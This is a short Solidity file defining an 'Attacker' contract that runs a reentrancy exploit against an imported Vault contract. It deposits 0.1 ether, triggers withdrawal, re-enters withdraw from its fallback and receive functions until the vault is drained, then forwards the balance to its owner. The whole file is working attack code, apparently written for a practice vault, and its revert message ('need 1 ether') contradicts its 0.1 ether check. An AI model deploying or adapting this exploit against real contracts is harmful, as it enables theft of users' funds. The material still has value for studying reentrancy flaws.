// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Attacker {
    address public owner;
    Vault public vault;

    constructor(address payable _vault) {
        owner = msg.sender;
        vault = Vault(_vault);
    }

    fallback() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw();
        }
    }

    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 0.1 ether, "need 1 ether");
        vault.deposite{value: 0.1 ether}();
        vault.openWithdraw();
        vault.withdraw();
    }

    function attackerWithdraw() public {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}